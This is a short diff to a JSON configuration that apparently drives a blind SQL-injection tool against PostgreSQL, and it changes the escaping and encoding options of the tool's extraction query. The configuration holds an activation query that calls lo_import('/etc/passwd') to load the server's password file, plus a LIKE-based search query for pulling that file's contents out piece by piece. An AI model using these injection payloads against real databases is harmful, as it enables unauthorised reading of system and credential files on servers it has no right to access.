@@ -7,10 +7,8 @@
         "injected_param_valid_value": "good_value",
         "time_threshold": 0.5,
         "sql_activation": "SELECT lo_import('/etc/passwd')",
-        "sql_search": "SELECT data from pg_largeobject where data like ':VAL:%' limit 1",
+        "sql_search": "SELECT data from pg_largeobject where data like :VAL: ESCAPE '\\' limit 1",
         "blacklist_prefix": "_",
         "single_value": true,
-        "escape_value": false,
-        "blacklist_chars": "%_",
-        "last_resort_chars": "_"
+        "encode_value": true
 }
